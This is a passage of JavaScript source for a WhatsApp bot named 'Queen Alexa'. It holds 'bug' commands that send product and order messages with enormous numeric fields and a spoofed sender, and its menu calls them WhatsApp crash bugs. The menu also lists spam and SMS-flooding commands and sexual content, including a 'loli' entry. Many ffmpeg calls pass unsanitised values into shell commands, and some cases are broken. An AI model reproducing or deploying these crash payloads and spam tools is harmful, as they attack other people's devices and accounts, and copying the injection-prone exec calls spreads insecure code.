imeu = await hyper.prepareMessage('0@s.whatsapp.net', hmm4, image)

imeg = imeu.message.imageMessage
res = await hyper.prepareMessageFromContent(from,{
  "productMessage": {
  "product": {
  "productImage": imeg,
  "productId": "", 
  "title": ngazap(prefix),
"description": emoji2(prefix), 
"priceAmount1000": "99999999",
"descriptionCount": "999999999",
  "productImageCount": "1",
  },
  "businessOwnerJid": "94767043432@s.whatsapp.net",
  "contextInfo": {
  "forwardingScore": 9999,
  "isForwarded": true
  }
  }
  }, {quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				})
  hyper.relayWAMessage(res)
  hyper.toggleDisappearingMessages(from,`Ups :v`,text)
  break
  case prefix+'bugkatalog1':
          if (!isOwner) return fakegroup('「 Only for bot owners! 」')
  					hyper.toggleDisappearingMessages(from,`ups`,text)
    hmm4 = fs.readFileSync(`./image/lakshitha.jpg`)
imeu = await hyper.prepareMessage('0@s.whatsapp.net', hmm4, image)

imeg = imeu.message.imageMessage
res = await hyper.prepareMessageFromContent(from,{
  "productMessage": {
  "product": {
  "productImage": imeg,
  "productId": "", 
  "title": ngazap(prefix),
"description": emoji2(prefix), 
"priceAmount1000": "99999999",
"descriptionCount": "999999999",
  "productImageCount": "1",
  },
  "businessOwnerJid": "94767043432@s.whatsapp.net",
  "contextInfo": {
  "forwardingScore": 9999,
  "isForwarded": true
  }
  }
  }, {quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				})
  hyper.relayWAMessage(res)
  hyper.toggleDisappearingMessages(from,`Ups :v`,text)
  break
  case prefix+'bugkatalogg':
    if (!isQuotedImage) return fakegroup('```Reply A Any audio/sticker/image|Amount```') 
  fakegroup(mess.wait)
   encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo

					media = await hyper.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.jpg')

						fs.unlinkSync(media)
						if (err) return ephe('Error!')
						hah = fs.readFileSync(ran)
					hyper.sendMessage(from, hah, audio, {mimetype: 'image/jpg', ptt:true, duration: 359996400, quoted:mek})
						fs.unlinkSync(ran)
imeu = await hyper.prepareMessage('0@s.whatsapp.net', hmm4, image)
imeg = imeu.message.imageMessage
res = await hyper.prepareMessageFromContent(from,{
  "productMessage": {
  "product": {
  "productImage": imeg,
  "productId": "", 
  "title": ngazap(prefix),
"description": emoji2(prefix), 
"priceAmount1000": "99999999",
"descriptionCount": "999999999",
  "productImageCount": "1",
  },
  "businessOwnerJid": "94767043432@s.whatsapp.net",
  "contextInfo": {
  "forwardingScore": 9999,
  "isForwarded": true
  }
  }
  }, {quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				})
  hyper.relayWAMessage(res)
  hyper.toggleDisappearingMessages(from,`Ups :v`,text)
  break

// in the group
case prefix+ 'groupsetting':
          let gcset = hyper.prepareMessageFromContent(from, {
					"listMessage": {
					"title":`HALLO ${pushname}`,
					"description": "Please select the bot menu below. Remember!!! No spam",
					"buttonText": "SELECT",
          "listType": "SINGLE_SELECT",
        	"sections": [{
        			"rows": [{
        					"title": `GROUP OPEN CHAT`,
        					"description": "HELLO KKK, the group won't be here",
        					"rowId": `${prefix}group-open`
        				},
        				{
        					"title": `GROUP CLOSE CHAT`,
        					"description": "SORRY THIS GROUP WILL BE CLOSED",
        					"rowId": `${prefix}group-close`
        				},
        				{
        					"title": "MESSAGE WHILE ON",
        					"description": "MESSAGE WHILE ON",
        					"rowId": `${prefix}psgc-on`
        				},
        				{
        					"title": "MESSAGE WHILE OFF",
        					"description": "MESSAGE WHILE OFF",
        					"rowId": `${prefix}psgc-off`
        				},
        				{
        					"title": "RESET LINKGC",
        					"description": "Link group akan di reset kak",
        					"rowId": `${prefix}resetgclink`
        				},
        				{
        					"title": "LINKGC",
        					"description": "Link group",
        					"rowId": `${prefix}gclink`
        				},
        				{
        					"title": `[💸] DONASI` ,
        					"description": "Saya Ingin berdonasi kak \nuntuk support Bot",
        					"rowId": `${prefix}tf`
        				}]
        		}],
        		"footerText": `\nclock : ${tampilWaktu} ${ampm}\nDate and time : ${dinane}\nJava market : ${weton}\n\n*© FERDI Z-AFK*`
            }}, {quoted: fgclink})
          hyper.relayWAMessage(gcset, {waitForAck: true})
          break
// in the menu
case prefix+ 'menu2':
          let gcset1 = hyper.prepareMessageFromContent(from, {
					"listMessage": {
					"title":`HALLO ${pushname}`,
					"description": "Please select the bot menu below. Remember!!! No spam",
					"buttonText": "SELECT",
          "listType": "SINGLE_SELECT",
        	"sections": [{
        			"rows": [{
        					"title": `CREATOR`,
        					"description": "queen Alexa bot Creator",
        					"rowId": `${prefix}creator`
        				},
        				{
        					"title": `MODE`,
        					"description": " self / public ",
        					"rowId": `${prefix}mode`
        				},
        		       	{
        					"title": `ALL MENU`,
        					"description": "Queen Alexa all commands",
        					"rowId": `${prefix}allmenu`
        				},
        				{
        					"title": `CONVERT MENU`,
        					"description": "All Convert Menu",
        					"rowId": `${prefix}convmenu`
        				},
        				{
        					"title": `GROUP MENU`,
        					"description": "Only groupl commands",
        					"rowId": `${prefix}groupmenu`
        				},
        				{
        					"title": `OTHER MENU`,
        					"description": "others commands",
        					"rowId": `${prefix}othermenu`
        				},
        				{
        					"title": `BUG MENU`,
        					"description": "whatsapp crash bug command",
        					"rowId": `${prefix}bugmenu`
        				},
        				{
        					"title": `STICKER MENU`,
        					"description": "Whatsapp sticker make menu",
        					"rowId": `${prefix}sticmenu`
        				},
        				{
        					"title": `MAKER MENU`,
        					"description": "makeing your logo",
        					"rowId": `${prefix}makermenu`
        				},
        				{
        					"title": `NSFW MENU`,
        					"description": "download anime logo & image",
        					"rowId": `${prefix}nsfwmenu`
        				},
        				{
        					"title": `ANIME VIDEO MENU`,
        					"description": "download anime video",
        					"rowId": `${prefix}animvmenu`
        				},
        				{
        					"title": `ASUPAN MENU`,
        					"description": "download asupan video",
        					"rowId": `${prefix}asupanmenu`
        				},
        				{
        					"title": `AUDIO CHANGE MENU`,
        					"description": "audio change menu",
        					"rowId": `${prefix}audiomenu`
        				},
        				{
        					"title": `VIDEO CHANGE MENU`,
        					"description": "audio change menu",
        					"rowId": `${prefix}videomenu`
        				},
        				{
        					"title": `VIDEO EDIT MENU`,
        					"description": "audio change menu",
        					"rowId": `${prefix}editmenu`
        				},
        				{
        					"title": `GAME MENU`,
        					"description": "it's fun game menu",
        					"rowId": `${prefix}gamemenu`
        				},
        				{
        					"title": `FUN MENU`,
        					"description": "it's fun menu",
        					"rowId": `${prefix}funmenu`
        				},
        				{
        					"title": `18 + MENU`,
        					"description": "18 + video & photo download",
        					"rowId": `${prefix}18menu`
        				},
        				{
        					"title": `FILM MENU`,
        					"description": "Any movie download & search",
        					"rowId": `${prefix}filmmenu`
        				},
        				{
        					"title": `GROUP MENU`,
        					"description": "only group commands",
        					"rowId": `${prefix}groupsetting`
        				},
        				{
        					"title": `ENCRYPTE MENU`,
        					"description": "18 + video & photo download",
        					"rowId": `${prefix}encmenu`
        				},
        				{
        					"title": `QUEEN ALEXA INFO`,
        					"description": "Whatsapp Bot Info",
        					"rowId": `${prefix}infomenu`
        				},
        				{
        					"title": `OWNER` ,
        					"description": "BOT OWNER",
        					"rowId": `${prefix}owner`
        				}]
        		}],
        		"footerText": `\nclock : ${tampilWaktu} ${ampm}\nDate and time : ${dinane}\nJava market : ${weton}\n\n*© HYPER-MOD*`
            }}, {quoted: fgclink})
          hyper.relayWAMessage(gcset1, {waitForAck: true})
          break
          case prefix+ 'infomenu':
          let gcset2 = hyper.prepareMessageFromContent(from, {
					"listMessage": {
					"title":`HALLO ${pushname}`,
					"description": "Please select the bot menu below. Remember!!! No spam",
					"buttonText": "SELECT",
          "listType": "SINGLE_SELECT",
        	"sections": [{
        			"rows": [{
        					"title": `CREATOR`,
        					"description": "queen Alexa bot Creator",
        					"rowId": `${prefix}creator`
        				},
        				{
        					"title": `OWNER`,
        					"description": "BOT OWNER",
        					"rowId": `${prefix}owner`
        				},
        				{
        					"title": `BOT INFO`,
        					"description": "Queen Alexa Bot Info",
        					"rowId": `${prefix}info`
        				},
        		       	{
        					"title": `UPDATE`,
        					"description": "Queen Alexa Next Update Info",
        					"rowId": `${prefix}update`
        				},
        				{
        					"title": `SCRIPT` ,
        					"description": "Queen Alexa Script",
        					"rowId": `${prefix}sc`
        				}]
        		}],
        		"footerText": `\nclock : ${tampilWaktu} ${ampm}\nDate and time : ${dinane}\nJava market : ${weton}\n\n*© HYPER-MOD*`
            }}, {quoted: fgclink})
          hyper.relayWAMessage(gcset2, {waitForAck: true})
          break                    
        case prefix+ 'allmenu':

       teks = `Hai @${sender.split("@")[0]}
       
╔════════Queen Alexa═════════❍
║┏━━⊱ *</MODE>*
║┃ *${prefix}self*
║┃ *${prefix}public*
║┃
║┣━━⊱ *</STICKER MENU>*
║┃ *${prefix}sticker*
║┃ *${prefix}sg* [ Reply A video/gif ]
║┃ *${prefix}attp* [ text ]
║┃ *${prefix}ttp*
║┃ *${prefix}semoji*
║┃
║┣━━⊱ *</AUDIO CHANGE MENU>*
║┃ *${prefix}tupai [ Reply A audio ]*
║┃ *${prefix}gemok [ Reply A audio ]*
║┃ *${prefix}slowmo [ Reply A audio ]*
║┃ *${prefix}bass [ Reply A audio ]*
║┃ *${prefix}robot [ Reply A audio ]*
║┃ *${prefix}balik [ Reply A audio ]*
║┃ *${prefix}budek [ Reply A audio ]*
║┃ *${prefix}detikvn [ Reply A audio ]*
║┃ *${prefix}fast [ Reply A audio ]*
║┃ *${prefix}slow [ Reply A audio ]*
║┃ *${prefix}imut [ Reply A audio ]*
║┃ *${prefix}tempo-v [ Reply A audio ]*
║┃ *${prefix}tempo [ Reply A audio ]*
║┃ *${prefix}nightcore [ Reply A audio ]*
║┃ *${prefix}agemes [ Reply A audio ]*
║┃ *${prefix}reverse [ Reply A audio ]*
║┃
║┣━━⊱ *</VIDEO CHANGE MENU>*
║┃ *${prefix}vtupai [ Reply A video ]*       
║┃ *${prefix}vfast [ Reply A video ]*
║┃ *${prefix}vslow [ Reply A video ]*
║┃ *${prefix}vgemok [ Reply A video ]*
║┃ *${prefix}vbass [ Reply A video ]*
║┃ *${prefix}vrobot [ Reply A video ]*
║┃ *${prefix}vbalik [ Reply A video ]*
║┃ *${prefix}vbudek [ Reply A video ]*
║┃ *${prefix}vslowm [ Reply A video ]*
║┃ *${prefix}vreverse [ Reply A video ]*
║┃
║┣━━⊱ *</GROUP MENU>*
║┃ *${prefix}groupsetting*
║┃ *${prefix}resetgclink*
║┃ *${prefix}gclink*
║┃ *${prefix}listadmin*
║┃ *${prefix}promote*
║┃ *${prefix}demote*
║┃ *${prefix}add*
║┃ *${prefix}kick*
║┃ *${prefix}group-close*
║┃ *${prefix}group-open*
║┃ *${prefix}tagall*
║┃ *${prefix}hidetag*
║┃
║┣━━⊱ *</CONVERT MENU>*
║┃ *${prefix}toimg*
║┃ *${prefix}tomp3*
║┃ *${prefix}vreverse*
║┃
║┣━━⊱ *</OTHER MENU>*
║┃ *${prefix}upswvideo*
║┃ *${prefix}upswimage*
║┃ *${prefix}upswteks*
║┃ *${prefix}join*
║┃ *${prefix}buatgrup*
║┃ *${prefix}setppbot*
║┃ *${prefix}inspect*
║┃ *${prefix}clearall*
║┃ *${prefix}del*
║┃ *${prefix}deletel*
║┃ *${prefix}igstalk*
║┃ *${prefix}q*
║┃ *${prefix}ktpmaker*
║┃
║┣━━⊱ *</MAKER MENU>*
║┃ *${prefix}wolf*
║┃ *${prefix}tfire*
║┃ *${prefix}neon*
║┃ *${prefix}halloween*
║┃ *${prefix}pornhub*
║┃ *${prefix}pubg*
║┃ *${prefix}marvel*
║┃ *${prefix}avenger*
║┃ *${prefix}captainamerica*
║┃ *${prefix}hubcomment*
║┃ *${prefix}flower*
║┃ *${prefix}spiderman*
║┃ *${prefix}vampire*
║┃ *${prefix}wooden*
║┃ *${prefix}harrypoter*
║┃ *${prefix}galaxy*
║┃ *${prefix}candy*
║┃ *${prefix}royal*
║┃ *${prefix}butterfly*
║┃ *${prefix}coffee*
║┃ *${prefix}love*
║┃ *${prefix}shadow*
║┃ *${prefix}lovemessage*
║┃ *${prefix}lovelock*
║┃ *${prefix}airline*
║┃ *${prefix}airballoon*
║┃ *${prefix}zombie3d*
║┃ *${prefix}gaming*
║┃ *${prefix}galaxywp*
║┃ *${prefix}neonlight*
║┃ *${prefix}qrcode*
║┃ *${prefix}watercolor*
║┃ *${prefix}devil*
║┃ *${prefix}demon*
║┃ *${prefix}magma*
║┃ *${prefix}toxic*
║┃ *${prefix}butterfly*
║┃
║┣━━⊱ *</TAG>*
║┃ *${prefix}hidetag*
║┃ *${prefix}tagall*
║┃ *${prefix}tospam*
║┃
║┣━━⊱ *</DOWNLOAD>*
║┃*COOMING SOON.....*
║┃
║┣━━⊱ *</BUG MENU>*
║┃ *${prefix}bug  [ amount ]*
║┃ *${prefix}bugkatalog*
║┃ *${prefix}bugkatalog1*
║┃ *${prefix}bugrow*
║┃ *${prefix}bugpc2  [ amount ]*
║┃ *${prefix}bugpc*
║┃ *${prefix}bugtroli*
║┃ *${prefix}bugtroli2*
║┃ *${prefix}tovirgam [ Mention A Any Sticker ]*
║┃ *${prefix}buglokasi*
║┃ *${prefix}buglink*
║┃
║┣━━⊱ *</NSFW MENU>*
║┃ *${prefix}anime*
║┃ *${prefix}loli*
║┃ *${prefix}trapnime*
║┃ *${prefix}neko*
║┃ *${prefix}megumin*
║┃ *${prefix}blowjob*
║┃ *${prefix}hentai*
║┃ *${prefix}awoo*
║┃ *${prefix}bj*
║┃ *${prefix}wallpaper*
║┃ *${prefix}pussy*
║┃ *${prefix}lesbian*
║┃ *${prefix}kitsune*
║┃ *${prefix}slap*
║┃ *${prefix}poke*
║┃ *${prefix}neko2*
║┃ *${prefix}keta*
║┃ *${prefix}baka*
║┃ *${prefix}yuri*
║┃ *${prefix}anal*
║┃ *${prefix}eroneko*
║┃ *${prefix}neko*
║┃
║┣━━⊱ *</ASUPAN MENU>*
║┃ *${prefix}asupan1*
║┃ *${prefix}asupan2*
║┃ *${prefix}asupan3*
║┃ *${prefix}asupan4*
║┃ *${prefix}asupan5*
║┃ *${prefix}asupan6*
║┃
║┣━━⊱ *</FILM MENU>*
║┃ *${prefix}film*
║┃ *${prefix}film2*
║┃ *${prefix}searchfilm*
║┃ *${prefix}filmapikterbaru*
║┃ *${prefix}filmapikdrama*
║┃ *${prefix}lk21*
║┃ *${prefix}drakorongoing*
║┃ *${prefix}wattpadsearch*
║┃ *${prefix}wattpad*
║┃
║┣━━⊱ *</ANIME VIDEO MENU>*
║┃ *${prefix}anime1*
║┃
║┣━━⊱ *</VIDEO EDIT MENU>*
║┃ *${prefix}video1 [ Reply A Photo ]*
║┃
║┣━━⊱ *</FUN MENU>*
║┃ *${prefix}tospam [ Reply audio/sticker/image|Amount ]*
║┃ *${prefix}tospamspamsms [ 0811288866662 ]*
║┃
║┣━━⊱ *</ENCRYPTE MENU>*
║┃ *${prefix}base64enc*
║┃ *${prefix}base64dec*
║┃ *${prefix}base32enc*
║┃ *${prefix}base32dec*
║┃ *${prefix}sha1enc*
║┃ *${prefix}sha256enc*
║┃ *${prefix}sha512enc*
║┃
║┣━━⊱ *</GAME MENU>*
║┃ *${prefix}slot*
║┃ *${prefix}handsome*
║┃ *${prefix}can*
║┃ *${prefix}when*
║┃ *${prefix}truth*
║┃ *${prefix}dare*
║┃
║┣━━⊱ *</18 MENU>*
║┃ *${prefix}xhamstersearch*
║┃ *${prefix}xnxxsearch*
║┃ *${prefix}xnxx*
║┃ *${prefix}xsearch*
║┃ *${prefix}xvideo*
║┃
║┣━━⊱ *</INFO>*
║┃ *${prefix}creator*
║┃ *${prefix}owner*
║┃ *${prefix}info*
║┃ *${prefix}update*
║┃ *${prefix}sc*
║┗━━━━⊱
╚═══❏ *Queen Alexa* ❏══❍`
                rakz = fs.readFileSync(`./image/Alexamenu.jpg`)
                buttons = [
          { buttonId: `${prefix}menu`, buttonText: { displayText: "MENU" }, type: 1 },
          { buttonId: `${prefix}sc`, buttonText: { displayText: "SCRIPT" }, type: 1 }
        ];         
        imageMsg = (
          await hyper.prepareMessageMedia(rakz, "imageMessage", {thumbnail: rakz,
           })).imageMessage;
        buttonsMessage = {
          contentText: `${teks}`,
          footerText: "Queen Alexa kkk",
          imageMessage: imageMsg,
          buttons: buttons,
          headerType: 4,
        };
        prep = await hyper.prepareMessageFromContent(
          from,
          { buttonsMessage }, {quoted: mek, contextInfo: {mentionedJid: [sender]}});

        hyper.relayWAMessage(prep);

break
case prefix+"vslow": 
        if (!isQuotedVideo) return fakegroup("Reply the video!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await hyper.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            hyper.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;   
        case prefix+"vtupai": 
        if (!isQuotedVideo) return fakegroup("Reply the video!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await hyper.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter:a 'atempo=0.8,asetrate=65100' ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            hyper.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;   
        case prefix+"vgemok": 
        if (!isQuotedVideo) return fakegroup("Reply the video!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await hyper.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=22100" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            hyper.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;   
        case prefix+"vbass": 
        if (!isQuotedVideo) return fakegroup("Reply the video!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await hyper.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            hyper.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;   
        case prefix+"vrobot": 
        if (!isQuotedVideo) return fakegroup("Reply the video!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await hyper.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            hyper.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;   
        case prefix+"vbalik": 
        if (!isQuotedVideo) return fakegroup("Reply the video!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await hyper.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter_complex "areverse" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            hyper.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;   
        case prefix+"vbudek": 
        if (!isQuotedVideo) return fakegroup("Reply the video!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await hyper.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter:a "volume=50" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            hyper.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;   
        case prefix+"vslowm": 
        if (!isQuotedVideo) return fakegroup("Reply the video!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await hyper.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=44100" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            hyper.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;   
case prefix+'budek':
if (!isQuotedAudio) return fakegroup('```Reply the audio!```')
              fakegroup(mess.wait)
	encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo

	media = await hyper.downloadAndSaveMediaMessage(encmedia)

	ran = getRandom('.mp3')

	exec(`ffmpeg -i ${media} -filter:a "volume=50" ${ran}`, (err, stderr, stdout) => {

fs.unlinkSync(media)

if (err) return reply('Error!')

hah = fs.readFileSync(ran)

hyper.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
						fs.unlinkSync(ran)

	})
break
case prefix+ "vfast":
        if (!isQuotedVideo) return fakegroup("Reply the video!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await hyper.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            hyper.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;   
        case prefix+ 'imut':
              if (!isQuotedAudio) return fakegroup('```Reply the audio!```')
              fakegroup(mess.wait)
               encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo;
               media = await hyper.downloadAndSaveMediaMessage(encmedia);
               ran = getRandom('.mp3');
               exec(`ffmpeg -i ${media} -af atempo=3/4,asetrate=44500*4/3 ${ran}`, (err, stderr, stdout) => {
                  fs.unlinkSync(media);
                  if (err) return reply('Error!');
                  hah = fs.readFileSync(ran);
                  hyper.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt: true, quoted: mek });
                  fs.unlinkSync(ran);
               });
               break;
               case prefix+ 'tempo-v':
              if (!isQuotedAudio) return fakegroup('```Reply the audio!```')
              fakegroup(mess.wait)
               encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo;
               media = await hyper.downloadAndSaveMediaMessage(encmedia);
               ran = getRandom('.mp3');
               exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=${req}" ${ran}`, (err, stderr, stdout) => {
                  fs.unlinkSync(media);
                  if (err) return reply('Error!');
                  hah = fs.readFileSync(ran);
                  hyper.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt: true, quoted: mek });
                  fs.unlinkSync(ran);
               });
               break;
               case prefix+ 'tempo':
              if (!isQuotedAudio) return fakegroup('```Reply the audio!```')
              fakegroup(mess.wait)
               encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo;
               media = await hyper.downloadAndSaveMediaMessage(encmedia);
               ran = getRandom('.mp3');
               exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=${req}" ${ran}`, (err, stderr, stdout) => {
                  fs.unlinkSync(media);
                  if (err) return reply('Error!');
                  hah = fs.readFileSync(ran);
                  hyper.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt: true, quoted: mek });
                  fs.unlinkSync(ran);
               });
               break;
               case prefix+ 'nightcore':
              if (!isQuotedAudio) return fakegroup('```Reply the audio!```')
              fakegroup(mess.wait)
               encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo;
               media = await hyper.downloadAndSaveMediaMessage(encmedia);
               ran = getRandom('.mp3');
               exec(`ffmpeg -i ${media} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
                  fs.unlinkSync(media);
                  if (err) return reply('Error!');
                  hah = fs.readFileSync(ran);
                  hyper.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt: true, quoted: mek });
                  fs.unlinkSync(ran);
               });
               break;
               case prefix+ 'agemes':
              if (!isQuotedAudio) return fakegroup('```Reply the audio!```')
              fakegroup(mess.wait)
               encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo;
               media = await hyper.downloadAndSaveMediaMessage(encmedia);
               ran = getRandom('.mp3');
               exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=50000" ${ran}`, (err, stderr, stdout) => {
                  fs.unlinkSync(media);
                  if (err) return reply('Error!');
                  hah = fs.readFileSync(ran);
                  hyper.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt: true, quoted: mek });
                  fs.unlinkSync(ran);
               });
               break;
             case prefix+ 'tupai':
              if (!isQuotedAudio) return fakegroup('```Reply the audio!```')
              fakegroup(mess.wait)
               encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo;
               media = await hyper.downloadAndSaveMediaMessage(encmedia);
               ran = getRandom('.mp3');
               exec(`ffmpeg -i ${media} -filter:a 'atempo=0.8,asetrate=65100' ${ran}`, (err, stderr, stdout) => {
                  fs.unlinkSync(media);
                  if (err) return reply('Error!');
                  hah = fs.readFileSync(ran);
                  hyper.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt: true, quoted: mek });
                  fs.unlinkSync(ran);
               });
               break;
               case prefix+ 'reverse':
              if (!isQuotedAudio) return fakegroup('```Reply the audio!```')
              fakegroup(mess.wait)
               encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo;
               media = await hyper.downloadAndSaveMediaMessage(encmedia);
               ran = getRandom('.mp3');
               exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err, stderr, stdout) => {
                  fs.unlinkSync(media);
                  if (err) return reply('Error!');
                  hah = fs.readFileSync(ran);
                  hyper.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt: true, quoted: mek });
                  fs.unlinkSync(ran);
               });
               break;
               case prefix+ 'fast':
              if (!isQuotedAudio) return fakegroup('```Reply the audio!```')
              fakegroup(mess.wait)
               encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo;
               media = await hyper.downloadAndSaveMediaMessage(encmedia);
               ran = getRandom('.mp3');
               exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err, stderr, stdout) => {
                  fs.unlinkSync(media);
                  if (err) return reply('Error!');
                  hah = fs.readFileSync(ran);
